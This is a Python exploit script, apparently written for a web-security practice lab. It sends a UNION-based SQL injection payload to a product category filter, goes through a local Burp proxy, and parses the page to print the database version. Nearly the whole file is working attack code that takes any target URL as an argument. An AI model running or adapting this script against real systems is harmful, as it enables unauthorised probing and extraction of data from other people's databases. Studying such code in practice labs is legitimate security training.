# Import necessary libraries
import requests  # For making HTTP requests
import sys  # For handling command-line arguments
import urllib3  # For disabling SSL/TLS warnings
from bs4 import BeautifulSoup  # For parsing HTML content
import re  # For regular expressions

# Disable SSL/TLS warnings about insecure requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Define proxy settings (used for intercepting and analyzing network traffic through BURPsuite)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# Function to exploit SQL injection vulnerability and extract the database version
def exploit_sqli_version(url):
    # Define the vulnerable path and SQL payload
    path = "/filter?category=Accessories"
    sql_payload = "'+UNION+SELECT+%40%40version,+NULL%23"
    
    # Send a GET request with the SQL payload
    r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
    res = r.text
    
    # Parse the HTML content using BeautifulSoup
    soup = BeautifulSoup(res, 'html.parser')
    
    # Find the version information using regular expressions, confirm this on regex101.com
    version = soup.find(string=re.compile('.*\d{1,2}\.\d{1,2}\.\d{1,2}.*'))
    
    # Check if version information was found
    if version is None:
        return False  # Version information not found
    else:
        print("[+] The database version is: " + version)
        return True  # Successful exploitation and version extraction

# Main program execution block
if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()  # Get target URL from command-line arguments
    except IndexError:
        # Print usage instructions and exit if the argument is missing
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    # Step: Exploit SQL injection vulnerability to dump the database version
    print("[+] Dumping the version of the database...")
    if not exploit_sqli_version(url):
        print("[-] Unable to dump the database version.")
